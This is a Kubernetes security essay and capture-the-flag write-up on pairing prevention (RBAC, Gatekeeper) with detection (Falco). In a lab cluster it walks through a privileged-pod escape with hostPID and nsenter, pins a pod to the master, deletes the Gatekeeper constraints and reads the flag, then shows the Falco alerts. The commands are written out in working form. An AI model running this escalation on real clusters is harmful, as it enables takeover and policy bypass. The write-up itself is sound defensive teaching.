---
title: Runtime Security in Kubernetes
date: 2020-01-06
author: Kris Nova
---

# Runtime Security in Kubernetes 

I would like to propose a philosophy that operating a secure Kubernetes cluster requires both **prevention** and **detection** tooling. Using both of the tactics, an operator will be able to *prevent* known vulnerabilities, while *detecting* anomalous behavior as well. 

This philosophy would be called `runtime security`.

In this experiment I will be documenting an example workflow of using Cloud Native prevention and detection tooling to tell a story of how a team might resolve an attack. This uses commonly known attack vectors in Kubernetes, and demonstrates how an organization could benefit from having both types of tooling installed in a cluster.

## Problem

#### Kubernetes itself moves quickly

Kubernetes [moves quickly, and new features are often added](https://github.com/kubernetes/kubernetes/releases). In 2018 I co-authored a book called [Cloud Native Infrastructure](https://www.cnibook.info/) that discussed the problem with an inability to upgrade cloud infrastructure. Tools like `kubeadm` and `cluster API` have since been built out on primitives like the ones defined in Cloud Native Infrastructure such as the `infrastructure reconcile pattern`. These tools enable users to install, and manage Kubernetes.  

#### Exploits are common

The security industry also moves quickly. Exploits and attack vectors are found in software very commonly. For instance there is even a [documented security audit](https://github.com/kubernetes/community/tree/master/wg-security-audit) with known threats and vectors in Kubernetes to this day. 

#### Kubernetes encourages complexity

Furthermore Kubernetes advertises [automating deployment, scaling, and management of containerized applications](https://kubernetes.io/). The Kubernetes community also is well known for using 3rd party applications to solve various operational problems in production. A list of the CNCF sponsored projects can be found [here](https://landscape.cncf.io/). Most of these have vast documentation on how to use them with Kubernetes.

It is of my personal belief that there are three noticeable trends with Kubernetes in Cloud Native.

 - Well documented and well known tooling to upgrade to new versions of Kubernetes.
 - Known threats, and attack vectors in Kubernetes.
 - An ecosystem that makes it easy to install new software while also promoting adoption of 3rd party applications in production.
 
This type of environment is chaotic, complex, and fundamentaly risky. 

## Thesis

 In this paper, we propose that having tooling in place to **prevent** unwanted behavior coupled with tooling to **detect** unwanted behavior is essential to securing cloud native environments.

### Prevention

In this proposal we break down prevention into two subsets **access control** and **policy enforcement**.

It is important to understand that both **access control** and **policy enforcement** are commonly used to solve many problems in Kubernetes. The term **prevention** applies when a user applies both of them to solve a security concern.

#### Access Control 

The concept of prevention in complex environments is not new. A common type of prevention is **access control** which we can see in the Linux kernel with features such as [access control with SELinux](https://marc.info/?l=linux-kernel&m=97749381725894) or in Kubernetes with [RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/).

As we begin to layer software it is critical to understand which layers these implementations are running at, or more importantly if the access control implementation is found at the same layer it is trying to protect. Furthermore we need to understand any interprocess communication that will be required for an access control system to work. 

An easy to understand example of when prevention tooling is running at the same layer it is trying to protect is [Kubernetes Admission Controllers](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#what-are-they) attempting to enforce policy. The Kubernetes documentation suggests a client server model for parsing and enforcing arbitrary policy, and even has documentation on [how to build your own](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#write-an-admission-webhook-server).

#### Policy

A well known implementation of using Kubernetes Admissions Controllers is [Gatekeeper](https://github.com/open-policy-agent/gatekeeper) which is part of the [Open Policy Agent (OPA)](https://www.openpolicyagent.org/docs/latest/#overview). The [documentation advertises policy decoupling](https://www.openpolicyagent.org/docs/latest/philosophy/#policy-decoupling). Which is a deliberate attempt to seperate the policy enforcement logic, from the gateway itself. An engineer could presumably use a tool like Kubernetes to manage policy enforcement logic in the same cluster it would be attempting to protect.

Furthermore there are resources in Kubernetes specifically designed to prevent exactly what this paper is exploiting. These are called [Pod Security Policies](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#policy-reference) or PSPs for short. These are a prevention tactic to prevent various types of Pods from being deployed.

### Detection 

In this proposal we break down detection into two subsets **observability** and **alerting**.

It is important to understand that both **observability** and **alerting** are commonly used to solve many problems in Kubernetes. The term **detection** applies when a user applies both of them to solve a security concern.

#### Observability

*Note*: in this document we use the term `observability` defined [here](https://en.wikipedia.org/wiki/Observability):

> In control theory, observability is a measure of how well internal states of a system can be inferred from knowledge of its external outputs.

The practice of observing events in computer science is also not a new concept. Everything from a simple logfile, to advanced systems observability could in theory be used for observability purposes. 

One example of very low level example is using a relatively new feature of the linux kernel, [an extension to Berkeley Packet Filter (BPF)](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter#Extensions_and_optimizations) commonly referred to as eBPF allows a user to write a program, that could parse kernel events in userspace.

> ...programs can be attached to tracepoints, kprobes, and perf events. Because eBPF programs can access kernel data structures, developers can write and test new debugging code without having to recompile the kernel.

[More](https://lwn.net/Articles/740157/) 

#### Alerting 

Alerting is the practice of triggering an event given a data stream observing a system that is reporting anomalous or unusual behavior.

One example of this is using another Cloud Native tool called Prometheus which [supports building and triggering alerts](https://prometheus.io/docs/practices/alerting/#alerting). 

There is another Cloud Native tool called Falco that uses [linux kernel observability to trigger alerts](https://falco.org/docs/#what-kind-of-behaviors-can-falco-detect). This tooling is specifically focused on detecting suspicious events in Linux by observing the kernel. 

# Capture the flag

We will be using Gatekeeper for prevention and Falco for detection in a Kubernetes cluster. We will be using an attack vector in Kubernetes defined in the security audit above. 

*Note*: While trying to install Gatekeeper with helm 3 I hit some issues and documented a fix [here](https://github.com/open-policy-agent/gatekeeper/issues/370). 

### The state of the world

 - Falco running in the `falco` namespace
 - Gatekeeper running the `gatekeeper-default` namespace preventing `namespaces` from being create without `label: "gatekeeper"`
 - The `config-admin` file is a kubeconfig with `cluster-admin` using RBAC
 - The `config-default` file is a kubeconfig with only access to the `default` namespace using RBAC
 - No Pod Security Policiy in place

Here is my environment:

```
[nova@nova .kube]$ ls -l
total 48
-rw------- 1 nova nova  5707 Dec 29 17:14 config
-rw------- 1 nova nova  5707 Dec 12 08:33 config-admin
-rw------- 1 nova nova  2716 Dec 12 09:55 config-default
[nova@nova .kube]$ cp config-admin config # This will give me "root" on the cluster so everything will work
cp: overwrite 'config'? y
[nova@nova .kube]$ k get po -n falco # Falco is installed
NAME             READY   STATUS    RESTARTS   AGE
falco-ds-v6jtd   1/1     Running   19         38d
falco-ds-zdsgm   1/1     Running   21         38d
[nova@nova .kube]$ k get po -n gatekeeper-system #Gatekeeper/OPA is Installed
NAME                                             READY   STATUS    RESTARTS   AGE
gatekeeper-controller-manager-578dc6fb84-4b4sk   1/1     Running   1          48m
[nova@nova .kube]$ k get po
No resources found in default namespace.
[nova@nova .kube]$ k get no
NAME                                          STATUS   ROLES    AGE   VERSION
ip-1-2-3-1.eu-west-1.compute.internal   Ready    node     40d   v1.13.10
ip-1-2-3-2.eu-west-1.compute.internal    Ready    node     40d   v1.13.10
ip-1-2-3-3.eu-west-1.compute.internal    Ready    master   40d   v1.13.10
```

The flag

```
[nova@nova .kube]$ k get po -n flag
NAME                     READY   STATUS    RESTARTS   AGE
nginx-7cdbd8cdc9-67gv6   1/1     Running   0          2m44s
[nova@nova .kube]$ k exec -it nginx-7cdbd8cdc9-67gv6 /bin/bash -n flag
root@nginx-7cdbd8cdc9-67gv6:/# ls -la | grep FLAG
-rw-r--r--   1 root root   12 Dec 30 01:46 FLAG
```

Now to demonstrate policy enforcement is working. Notice I am still cluster admin at this point.

```
[nova@nova .kube]$ k create ns my-new-namespace
Error from server ([denied by ns-must-have-gk] you must provide labels: {"gatekeeper"}): admission webhook "validation.gatekeeper.sh" denied the request: [denied by ns-must-have-gk] you must provide labels: {"gatekeeper"}
```

Switching over to our `default` config you can see RBAC is also now working.

```
[nova@nova .kube]$ k get po -n falco
NAME             READY   STATUS    RESTARTS   AGE
falco-ds-v6jtd   1/1     Running   19         38d
falco-ds-zdsgm   1/1     Running   21         38d
[nova@nova .kube]$ cp config-default config
cp: overwrite 'config'? y
[nova@nova .kube]$ k get po -n falco
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:nova-sa" cannot list resource "pods" in API group "" in the namespace "falco"
[nova@nova .kube]$ k create ns my-new-namespace
Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:default:nova-sa" cannot create resource "namespaces" in API group "" at the cluster scope
[nova@nova .kube]$ 
```

## Privilege escalation exploit 

First, deploy a privileged pod to Kubernetes

```
[nova@nova ~]$ kubectl run entry --image nginx --overrides '{"spec":{"hostPID":true,"containers":[{"name":"nginx","image":"nginx","command":["/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}' --rm --restart=Never -it --attach
If you don't see a command prompt, try pressing enter.
root@entry:/#
```

This is a dangerous, yet well known feature. For example [docker issue #37161](https://github.com/moby/moby/issues/37161#issue-326813022) 

Using the available namespaces in Linux we can mount various namespaces, and build a very handsome TTY. We use `nsenter` for this.

Once there not only can we enjoy the networking namespaces on the host. But we also can conveniently use the tooling installed there as well. In this case we use `arp -a` to see what we can find. 

```
root@entry:/# nsenter -t 1 -m -u -i -n bash
root@ip-172-20-32-143:/# arp -a
? (100.96.2.145) at ae:28:b0:a1:bd:a7 [ether] on cbr0
? (100.96.2.141) at d2:85:ef:1a:d3:54 [ether] on cbr0
? (100.96.2.137) at 0e:90:84:41:fd:7a [ether] on cbr0
ip-172-20-40-58.eu-west-1.compute.internal (172.20.40.58) at 02:02:d7:35:28:a0 [ether] on eth0
? (100.96.2.142) at 2e:5b:b1:de:a7:26 [ether] on cbr0
? (100.96.2.143) at 26:20:ac:e2:ec:1e [ether] on cbr0
ip-172-20-32-1.eu-west-1.compute.internal (172.20.32.1) at 12:81:f3:5f:81:52 [ether] on eth0
root@ip-172-20-32-143:/# 
```

We find some familiar looking hostnames. In AWS, typically Kubernetes nodes are named after the hostname. So we try them to find our master.

```
[nova@nova ~]$ kubectl run entry --image nginx --overrides '{"spec":{"nodeName":"ip-1-2-3-3.eu-west-1.compute.internal","hostPID":true,"containers":[{"name":"nginx","image":"nginx","command":["/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}' --rm --restart=Never -it --attach
If you don't see a command prompt, try pressing enter.
root@entry:/# nsenter -t 1 -m -u -i -n bash
root@ip-172-20-40-58:/# kubectl get po -n kube-system | wc -l # :D
16
```

Because we are running kops, the master happens to have `kubectl` conveniently already set up for us. We can delete the Gatekeeper configuration opening up the cluster from our policy constraints. 

```
root@ip-172-20-40-58:/# kubectl get constraints 
NAME                AGE
k8srequiredlabels   1h
root@ip-172-20-40-58:/# kubectl delete constraints k8srequiredlabels # :D
constrainttemplate.templates.gatekeeper.sh "k8srequiredlabels" deleted
```

At this point we are able to violate the OPA policy we set up, as well as bypass Kubernetes RBAC. We capture the flag, and have been able to take over the cluster.

```
root@ip-172-20-40-58:/# kubectl get pods -n flag
NAME                     READY   STATUS    RESTARTS   AGE
nginx-7cdbd8cdc9-67gv6   1/1     Running   0          72m
root@ip-172-20-40-58:/# kubectl exec -it nginx-7cdbd8cdc9-67gv6 -n flag /bin/bash
root@nginx-7cdbd8cdc9-67gv6:/# cat FLAG
a2bc3d1a4cd
root@nginx-7cdbd8cdc9-67gv6:/# 
```

### Falco Logs

Falco runs a layer below Kubernetes and takes advantage of a feature in the kernel called kernel tracing. Falco uses kernel tracing tactics like eBPF to parse kernel events. These events are enriched with data from the container runtime, as well as Kubernetes itself. Below you can see how a user would have been alerted to generally suspicious events. 

```
02:49:22.999198277: Warning Shell history had been deleted or renamed (user=root type=openat command=bash fd.name=/root/.bash_history name=/root/.bash_history path=<NA> oldpath=<NA> k8s.ns=default k8s.pod=entry container=654df7c59e58) k8s.ns=default k8s.pod=entry container=654df7c59e58 k8s.ns=default k8s.pod=entry container=654df7c59e58
02:49:32.503986944: Notice Attach/Exec to pod (user=system:serviceaccount:default:nova-sa pod=entry ns=default action=attach command=<NA>)
02:49:42.265344400: Warning Shell history had been deleted or renamed (user=root type=unlinkat command=dockerd -H fd:// --ip-masq=false --iptables=false --log-driver=json-file --log-level=warn --log-opt=max-file=5 --log-opt=max-size=10m --storage-driver=overlay2 fd.name=<NA> name=/var/lib/docker/overlay2/901a3b2e777e330e74ff1357b410f67ce7d6329a6c615177b21a1af3a30803f2/diff/root/.bash_history path=<NA> oldpath=<NA> k8s.ns=<NA> k8s.pod=<NA> container=host) k8s.ns=<NA> k8s.pod=<NA> container=host k8s.ns=<NA> k8s.pod=<NA> container=host
02:54:18.814529024: Warning Disallowed namespace created (user=system:serviceaccount:default:nova-sa ns=<NA>)
02:56:45.139533056: Notice Attach/Exec to pod (user=system:unsecured pod=falco-ds-zdsgm ns=falco action=exec command=%2Fbin%2Fbash)
02:57:06.217007058: Notice A shell was spawned in a container with an attached terminal (user=root k8s.ns=falco k8s.pod=falco-ds-v6jtd container=b89fb893ba70 shell=bash parent=docker-runc cmdline=bash terminal=34816 container_id=b89fb893ba70 image=falcosecurity/falco) k8s.ns=falco k8s.pod=falco-ds-v6jtd container=b89fb893ba70 k8s.ns=falco k8s.pod=falco-ds-v6jtd container=b89fb893ba70
02:57:06.164798976: Notice Attach/Exec to pod (user=system:unsecured pod=falco-ds-v6jtd ns=falco action=exec command=%2Fbin%2Fbash)
02:57:28.934473198: Warning Shell history had been deleted or renamed (user=root type=openat command=bash fd.name=/root/.bash_history name=/root/.bash_history path=<NA> oldpath=<NA> k8s.ns=falco k8s.pod=falco-ds-v6jtd container=b89fb893ba70) k8s.ns=falco k8s.pod=falco-ds-v6jtd container=b89fb893ba70 k8s.ns=falco k8s.pod=falco-ds-v6jtd container=b89fb893ba70
02:58:44.979413526: Notice A shell was spawned in a container with an attached terminal (user=root k8s.ns=flag k8s.pod=nginx-7cdbd8cdc9-67gv6 container=268a28e93f14 shell=bash parent=docker-runc cmdline=bash terminal=34816 container_id=268a28e93f14 image=nginx) k8s.ns=flag k8s.pod=nginx-7cdbd8cdc9-67gv6 container=268a28e93f14 k8s.ns=flag k8s.pod=nginx-7cdbd8cdc9-67gv6 container=268a28e93f14
02:49:28.743307008: Warning Pod started with privileged container (user=system:serviceaccount:default:nova-sa pod=entry ns=default image=nginx)
02:52:41.920078080: Warning Disallowed namespace created (user=system:unsecured ns=my-new-namespace)
02:54:26.914213120: Warning Pod started with privileged container (user=system:serviceaccount:default:nova-sa pod=entry ns=default image=nginx)
02:54:31.269857024: Notice Attach/Exec to pod (user=system:serviceaccount:default:nova-sa pod=entry ns=default action=attach command=<NA>)
02:56:45.194068725: Notice A shell was spawned in a container with an attached terminal (user=root k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff shell=bash parent=docker-runc cmdline=bash terminal=34816 container_id=493b88ce97ff image=falcosecurity/falco) k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff
02:56:50.233962101: Warning Shell history had been deleted or renamed (user=root type=openat command=bash fd.name=/root/.bash_history name=/root/.bash_history path=<NA> oldpath=<NA> k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff) k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff
02:57:31.939322303: Notice A shell was spawned in a container with an attached terminal (user=root k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff shell=bash parent=docker-runc cmdline=bash terminal=34816 container_id=493b88ce97ff image=falcosecurity/falco) k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff k8s.ns=falco k8s.pod=falco-ds-zdsgm container=493b88ce97ff
02:57:31.893552896: Notice Attach/Exec to pod (user=system:unsecured pod=falco-ds-zdsgm ns=falco action=exec command=%2Fbin%2Fbash)
02:58:44.943840000: Notice Attach/Exec to pod (user=system:unsecured pod=nginx-7cdbd8cdc9-67gv6 ns=flag action=exec command=%2Fbin%2Fbash)
```

It is important to note that Falco currently is not running on the master node. Furthermore Falco would alerts on itself as it needs to run in privileged mode to access the kernel events. 

# Findings

We were able to bypass Kubernetes RBAC by using a known exploit. We were then able to disable the policy enforcement and create a new namespace. Furthermore we were able to list namespaces and thus find the flag. 

## Prevention

In this example we were able to exploit the **access control** mechanism, and use that to exploit the **policy enforcement** mechanism. Because these two systems were running at the same level on the system, the exploit was relatively trivial. 

## Detection 

In this example we were able to detect most of the suspicious events in the cluster. Once we gained access to the master node, the Falco DaemonSet wasn't running and missed some of our events. 


# Conclusions

The majority of Kubernetes production users would not be surprised by this exercise. Most would be using RBAC and Pod Security Policies to prevent this from ever happening.

However, as noted above the ecosystem is complex and moves quickly. So threats such as this are hard to keep up with, or aren't even discovered yet. For instance in November of 2018 this [unknown exploit kubernetes #71411](https://github.com/kubernetes/kubernetes/issues/71411) was discovered. 

Furthermore, even the best prevention tactics wouldn't protect against vulnerable applications. For instance [this vulnerability that affected the Kubernetes dashboard](https://www.openwall.com/lists/oss-security/2019/02/11/2) demonstrates how running a vulnerable application can jeopardize a cluster. Having a **runtime security** tool in place could have detected and alerted if this was being exploited.

In this example however the user would detect this behavior via an alert from Falco. Then begin to prevent it with policy in Gatekeeper, or introducing Pod Security Policies into their cluster. Again, the goal here is for both **prevention** and **detection** tooling to work in harmony. 

This would be an ongoing cycle. I believe it is important to have an ongoing interaction between **prevention** and **detection** tooling. I believe the ecosystem will benefit from both of these, as well as the relationship between them. 


